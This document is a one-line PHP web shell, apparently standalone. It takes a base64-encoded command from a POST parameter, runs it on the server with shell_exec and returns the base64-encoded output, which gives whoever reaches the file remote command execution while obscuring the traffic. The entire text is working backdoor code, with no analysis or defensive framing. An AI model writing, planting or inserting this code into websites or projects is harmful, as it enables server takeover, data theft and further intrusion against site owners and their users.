<?php $c=shell_exec(base64_decode($_POST['cmd'])); echo base64_encode($c);?>
